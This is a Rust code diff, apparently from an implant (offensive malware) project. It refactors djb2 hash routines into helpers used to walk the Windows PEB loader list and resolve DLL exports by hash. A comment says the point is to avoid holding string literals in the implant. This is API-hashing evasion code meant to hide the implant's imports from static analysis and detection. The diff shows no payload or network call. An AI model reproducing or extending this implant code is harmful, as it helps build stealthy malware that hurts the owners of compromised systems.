@@ -35,6 +35,38 @@ pub fn djb2(s: &[u8]) -> u32 {
     h
 }
 
+/// djb2 hash over the low byte of each `u16` in a UTF-16 slice.
+/// Used to match module names from the PEB loader list (UTF-16)
+/// without holding string literals in the implant.
+/// # Safety
+/// `ptr..ptr+len` must be a valid UTF-16 buffer.
+pub unsafe fn djb2_utf16(ptr: *const u16, len: usize) -> u32 {
+    let mut h: u32 = 5381;
+    for i in 0..len {
+        let c = *ptr.add(i);
+        let lo = (c & 0xFF) as u8;
+        h = h.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
+    }
+    h
+}
+
+/// djb2 hash of a null-terminated ASCII C string.
+/// PE export names are 8-bit C strings; this avoids pulling them
+/// through a slice when the caller just needs the hash.
+///
+/// # Safety
+/// `ptr` must point to a valid, null-terminated ASCII string.
+unsafe fn djb2_ascii_z(mut ptr: *const u8) -> u32 {
+    let mut h: u32 = 5381;
+    while *ptr != 0 {
+        h = h
+            .wrapping_mul(33)
+            .wrapping_add((*ptr).to_ascii_lowercase() as u32);
+        ptr = ptr.add(1);
+    }
+    h
+}
+
 /// A resolved module: base address + a view over its PE export directory.
 #[derive(Clone, Copy)]
 pub struct Module {
@@ -70,15 +102,7 @@ impl Module {
             for i in 0..n {
                 let name_rva = *names.add(i);
                 let name_ptr = base.add(name_rva as usize);
-                // Hash the C string up to the NUL.
-                let mut h: u32 = 5381;
-                let mut p = name_ptr;
-                while *p != 0 {
-                    h = h
-                        .wrapping_mul(33)
-                        .wrapping_add((*p).to_ascii_lowercase() as u32);
-                    p = p.add(1);
-                }
+                let h = djb2_ascii_z(name_ptr);
                 if h == name_hash {
                     let ord = *ordinals.add(i) as usize;
                     // Bounds check: ordinal index must be within AddressOfFunctions.
@@ -275,15 +299,7 @@ unsafe fn find_module_by_hash(name_hash: u32) -> Option<Module> {
         let name_buf = (*entry).base_dll_name.buffer;
         let name_len = (*entry).base_dll_name.length as usize / 2; // bytes->chars
         if !name_buf.is_null() && name_len > 0 {
-            let chars = core::slice::from_raw_parts(name_buf, name_len);
-            // djb2 over the UTF-16 low bytes (ASCII module names fit in low byte).
-            let mut h: u32 = 5381;
-            for &c in chars {
-                let lo = (c & 0xFF) as u8;
-                h = h
-                    .wrapping_mul(33)
-                    .wrapping_add(lo.to_ascii_lowercase() as u32);
-            }
+            let h = djb2_utf16(name_buf, name_len);
             if h == name_hash {
                 return Some(parse_module((*entry).dll_base as *mut u8));
             }
@@ -424,14 +440,7 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
         let nb = (*entry).base_dll_name.buffer;
         let nl = (*entry).base_dll_name.length as usize / 2;
         if !nb.is_null() && nl > 0 {
-            let chars = core::slice::from_raw_parts(nb, nl);
-            // djb2 over UTF-16 low bytes (ASCII names fit).
-            let mut mh: u32 = 5381;
-            for &c in chars {
-                mh = mh
-                    .wrapping_mul(33)
-                    .wrapping_add(((c & 0xff) as u8).to_ascii_lowercase() as u32);
-            }
+            let mh = djb2_utf16(nb, nl);
             if mh == mod_hash {
                 let base = (*entry).dll_base as *mut u8;
                 return export_addr_by_hash_pub(base, fn_hash);
@@ -481,14 +490,7 @@ unsafe fn export_addr_by_hash_pub(base: *mut u8, fn_hash: u32) -> Option<usize> 
     for i in 0..n {
         let name_rva = *names.add(i);
         let name_ptr = base.add(name_rva as usize);
-        let mut h: u32 = 5381;
-        let mut p = name_ptr;
-        while *p != 0 {
-            h = h
-                .wrapping_mul(33)
-                .wrapping_add((*p).to_ascii_lowercase() as u32);
-            p = p.add(1);
-        }
+        let h = djb2_ascii_z(name_ptr);
         if h == fn_hash {
             let ord = *ordinals.add(i) as usize;
             // Bounds check: ordinal index must be within AddressOfFunctions.
